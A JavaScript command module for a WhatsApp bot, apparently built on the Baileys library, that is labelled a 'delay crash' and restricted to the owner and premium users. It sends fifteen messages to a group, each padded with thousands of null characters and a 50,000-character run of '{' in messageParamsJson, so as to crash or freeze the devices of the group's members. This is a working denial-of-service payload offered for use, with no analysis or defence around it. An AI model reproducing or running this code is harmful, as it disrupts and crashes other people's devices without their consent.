import { isPremiumUser } from '../../utils/premiumStore.js';
export default {
    name: 'delayg', aliases: ['delaygc', 'delaycrash'], category: 'bug',
    description: 'Delay crash on group (slow payload flood)', usage: 'delayg', cooldown: 30, ownerOnly: true, groupOnly: true,
    async execute({ sock, message, from, sender, isOwner }) {
        if (!isPremiumUser(sender) && !isOwner) return sock.sendMessage(from, { text: '❌ Premium required.' }, { quoted: message });
        await sock.sendMessage(from, { react: { text: '⏳', key: message.key } });
        for (let i = 0; i < 15; i++) {
            try { await sock.relayMessage(from, { ephemeralMessage: { message: { interactiveMessage: { header: { title: "\u0000".repeat(3000), hasMediaAttachment: false }, body: { text: "\u0000".repeat(3000) }, nativeFlowMessage: { messageParamsJson: "{".repeat(50000) } } } } }, {}); } catch {}
            await new Promise(r => setTimeout(r, 1000));
        }
        await sock.sendMessage(from, { text: '✅ Delay crash done' }, { quoted: message });
    }
};
